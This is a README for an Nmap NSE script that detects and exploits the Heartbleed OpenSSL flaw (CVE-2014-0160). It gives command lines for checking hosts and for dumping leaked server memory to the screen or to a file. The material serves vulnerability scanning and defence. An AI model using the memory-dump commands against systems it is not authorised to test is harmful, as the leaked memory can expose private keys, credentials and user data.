ssl-heartbleed.nse
======================

Nmap NSE script that discovers/exploits Heartbleed/CVE-2014-0160. This script is now basically the one Patrik Karlsson wrote with some minor changes ported from my own script.

### Features
* Includes support for FTP,SMTP,XMPP (https://github.com/nmap/nmap/blob/master/nselib/sslcert.lua#L231).
* Supports all versions of TLS (TLSv1.0, TLSv1.1, TLSv1.2).
* Print leaked memory as hex dump.
* Dump leaked memory into a file.

### Usage
#### Check if a host is vulnerable
This runs on every SSL, FTP, SMTP and/or XMPP port.
```
$ nmap --script ./openssl-heartbleed.nse host.tld
```
#### Dump leaked memory from a vulnerable host
Dumping leaked memory is enabled by increasing Nmap's debug level via -d flag.
```
$ nmap -d --script=./openssl-heartbleed.nse host.tld
```
#### Dump leaked memory into a file
```
$ nmap --script ./ssl-heartbleed.nse --script-args 'ssl-heartbleed.dumpfile=/tmp/heartbleed.dump' host.tld
```
#### Run ssl-heartbleed.nse against every port
Force the script to run on each port, regardless if the servie was detected or not.
```
$ nmap --script +./ssl-heartbleed.nse host.tld
```
